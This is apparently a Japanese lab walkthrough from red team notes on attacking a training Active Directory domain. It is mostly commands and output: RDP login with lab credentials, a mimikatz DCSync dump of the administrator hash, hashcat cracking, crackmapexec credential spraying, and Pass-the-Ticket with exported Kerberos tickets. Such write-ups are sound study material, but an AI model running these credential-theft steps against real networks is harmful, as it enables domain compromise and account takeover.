---
title: Walkthrough
parent: Active Directory
grand_parent: Red Team
---

# VMGp2 DCSync
## 接続
#Kali
```zsh
xfreerdp3 /cert:ignore /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.158.74 /dynamic-resolution
```

## DCsync攻撃
#CLIENT74
```mimikatz
lsadump::dcsync /user:corp\administrator
```
![](../../../assets/images/Pasted%20image%2020260502094949.png)
## ハッシュ解析
#Kali
```zsh
echo '2892d26cdf84d7a70e2eb3b9f05c425e' > hashes.dcsync3 

sudo hashcat -m 1000 hashes.dcsync3 'rockyou.txt' -r /usr/share/hashcat/rules/best64.rule --force
```
2892d26cdf84d7a70e2eb3b9f05c425e:lab
![](../../../assets/images/Pasted%20image%2020260502094944.png)

# VMGp3

初期アカウントが与えられている
Files04に管理者権限がある
```zsh
└─$ crackmapexec smb 192.168.158.70-76 -u leon -p 'HomeTaping199!' -d corp.com --continue-on-success
SMB         192.168.158.74  445    CLIENT74         [*] Windows 11 Build 22000 x64 (name:CLIENT74) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.158.72  445    WEB04            [*] Windows Server 2022 Build 20348 x64 (name:WEB04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.158.70  445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:corp.com) (signing:True) (SMBv1:False)
SMB         192.168.158.73  445    FILES04          [*] Windows Server 2022 Build 20348 x64 (name:FILES04) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.158.75  445    CLIENT75         [*] Windows 11 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.158.76  445    CLIENT76         [*] Windows 10 / Server 2016 Build 16299 x64 (name:CLIENT76) (domain:corp.com) (signing:False) (SMBv1:False)
SMB         192.168.158.74  445    CLIENT74         [+] corp.com\leon:HomeTaping199! (Pwn3d!)
SMB         192.168.158.72  445    WEB04            [+] corp.com\leon:HomeTaping199! 
SMB         192.168.158.70  445    DC1              [+] corp.com\leon:HomeTaping199! 
SMB         192.168.158.73  445    FILES04          [+] corp.com\leon:HomeTaping199! (Pwn3d!)
SMB         192.168.158.75  445    CLIENT75         [+] corp.com\leon:HomeTaping199! 
SMB         192.168.158.76  445    CLIENT76         [+] corp.com\leon:HomeTaping199!
```
![](../../../assets/images/Pasted%20image%2020260502094936.png)
# VMGp4

## Pass the Ticket


### チケットのエクスポート
```powersehll
mimikatz # sekurlsa::tickets /export
```
![](../../../assets/images/Pasted%20image%2020260502094929.png)
### チケットの挿入
```powershell
mimikatz # kerberos::ptt [0;2ecd1e]-0-0-40810000-dave@cifs-web04.kirbi
```
![](../../../assets/images/Pasted%20image%2020260502094924.png)
### チケットの確認
```powershell
klist
```
![](../../../assets/images/Pasted%20image%2020260502094919.png)

### アクセス
```powershell
ls \\web04\backup

type \\web04\backup\proof.txt
```
![](../../../assets/images/Pasted%20image%2020260502094915.png)